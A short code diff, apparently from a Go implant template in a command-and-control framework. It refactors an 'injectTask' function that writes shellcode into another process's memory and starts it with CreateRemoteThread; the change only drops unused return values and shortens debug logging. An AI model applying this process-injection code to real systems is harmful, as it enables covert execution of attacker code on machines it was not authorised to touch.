@@ -131,9 +131,9 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 	}
 
 	// Write the shellcode into the remotely allocated buffer
-	writeMemorySuccess, err := writeProcessMemory(processHandle, remoteAddr, unsafe.Pointer(dataAddr), uint32(dataSize))
+	_, err = writeProcessMemory(processHandle, remoteAddr, unsafe.Pointer(dataAddr), uint32(dataSize))
 	// {{if .Debug}}
-	log.Printf("writeprocessmemory returned: writeMemorySuccess = %v, err = %v", writeMemorySuccess, err)
+	log.Printf("writeprocessmemory returned: err = %v", err)
 	// {{end}}
 	if err != nil {
 		// {{if .Debug}}
@@ -147,9 +147,9 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 	log.Println("successfully injected data, starting remote thread ....")
 	// {{end}}
 	attr := new(syscall.SecurityAttributes)
-	createThreadSuccess, _, err := createRemoteThread(processHandle, attr, 0, uintptr(remoteAddr), 0, 0)
+	_, _, err = createRemoteThread(processHandle, attr, 0, uintptr(remoteAddr), 0, 0)
 	// {{if .Debug}}
-	log.Printf("createremotethread returned: createThreadSuccess = %v, err = %v", createThreadSuccess, err)
+	log.Printf("createremotethread returned:  err = %v", err)
 	// {{end}}
 	if err != nil {
 		// {{if .Debug}}
